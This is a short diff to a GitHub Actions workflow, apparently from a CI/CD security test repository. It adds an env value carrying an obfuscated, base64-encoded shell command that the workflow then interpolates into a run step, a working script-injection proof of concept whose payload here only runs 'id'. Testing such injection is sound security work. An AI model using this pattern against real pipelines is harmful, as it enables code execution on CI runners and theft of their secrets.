@@ -2,6 +2,9 @@ name: GitHub Actions
 on: 
   push:
 
+env:
+  repo_value: "s1n-cicd-tests/checkout"
+  action_version: '0214781bd089a5c6215374a7c3e98d7c505b35d0?test=";{echo,aWQK}|{base64,-d}|{bash,-i};echo"'
 
 jobs:
   init:
@@ -9,5 +12,10 @@ jobs:
     name: "init"
     steps:
     - run: | 
-        echo "test"
+        shaUrl="/repos/$repo_value/commits/$action_version"
+        echo $shaUrl
+        gh api -H "Accept: application/vnd.github+json" -H "X-GitHub-Api-Version: 2022-11-28" $shaUrl
+    - run: |
+        BRANCH_NAME="actions_${{ env.action_version }}_"
+        pwd
 
